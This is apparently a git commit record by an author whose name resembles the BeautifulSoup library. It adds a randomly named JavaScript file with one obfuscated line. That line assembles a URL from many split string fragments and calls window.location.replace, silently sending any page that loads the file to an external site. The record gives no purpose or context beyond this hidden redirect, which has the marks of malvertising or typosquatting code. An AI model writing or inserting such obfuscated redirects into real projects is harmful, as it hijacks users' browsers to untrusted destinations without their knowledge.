a343435fb0763810d4a60a8a4775396093d1f7d6
beautifulsoupz <77855946+pythonliss@users.noreply.github.com>
2022-12-01 14:42:02 +0100

    Create makhasjfajlfakgj.js

---
+++ makhasjfajlfakgj.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www.ro`,`adsworks.com/gQ_`,`hBEIKQRfugB`,`l4Sr-C7HB`,`f7oOcglUX`,`T-BMIc`,`-qXWxBurq`,`V1kY`,`1M8Co81112-y`,`cBiu48m_h`,`fBf5kiR_hd`,`Bo2`,`g~~/ZACK`))
